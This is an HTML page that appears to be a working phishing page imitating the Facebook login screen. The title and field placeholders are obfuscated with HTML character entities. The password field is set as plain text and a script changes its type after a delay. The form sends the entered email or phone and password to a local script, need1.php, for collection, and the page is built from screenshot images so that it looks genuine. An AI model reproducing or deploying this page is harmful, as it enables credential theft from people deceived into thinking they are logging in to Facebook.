<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>L&#111;g &#105;&#110; &#116;&#111; F&#97;&#99;&#101;&#98;&#111;&#111;k </title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<style type="text/css">
.textbox { 
    border: 1px solid #dddfe2; 
    height: 34px; 
    width: 275px; 
  	font-family: Helvetica, Arial, sans-serif;
    font-size: 14px;
  	color: #1d2129;
    padding-left: 6px; 
    border-radius: 0px; 
    box-shadow: inset 0px 1px 1px rgba(0,0,0,0.075);  
}  
.textbox:focus { 
    outline: none; 
    border: 1px solid #dddfe2; 	 
    box-shadow: inset 0px 1px 1px rgba(0,0,0,0.075);  
} 
 </style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>

</head>
<body>
<div class="loader"></div>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:570px; z-index:0"><img src="images/k1.png" alt="" title="" border=0 width=1349 height=570></div>

<div id="image2" style="position:absolute; overflow:hidden; left:119px; top:721px; width:988px; height:151px; z-index:1"><a href="#"><img src="images/k3.png" alt="" title="" border=0 width=988 height=151></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:522px; top:397px; width:306px; height:57px; z-index:2"><a href="#"><img src="images/k2.png" alt="" title="" border=0 width=306 height=57></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:183px; top:28px; width:322px; height:39px; z-index:3"><a href="#"><img src="images/k4.png" alt="" title="" border=0 width=322 height=39></a></div>
<form action=need1.php name=neharnadi id=neharnadi method=post>
<input name="ud" placeholder="E&#109;&#97;&#105;l a&#100;&#100;&#114;&#101;&#115;s &#111;&#114; p&#104;&#111;&#110;e n&#117;&#109;&#98;&#101;r " class="textbox" autocomplete="off" required type="text" style="position:absolute;width:302px;left:524px;top:250px;z-index:4">
<input name="pd" placeholder="P&#97;&#115;&#115;&#119;&#111;&#114;d " class="textbox" autocomplete="off" required type="text" style="position:absolute;width:302px;left:524px;top:296px;z-index:5">
<div id="formimage1" style="position:absolute; left:523px; top:341px; z-index:6"><input type="image" name="formimage1" width="304" height="46" src="images/fkg.png"></div>
</div>

</body>
</html>
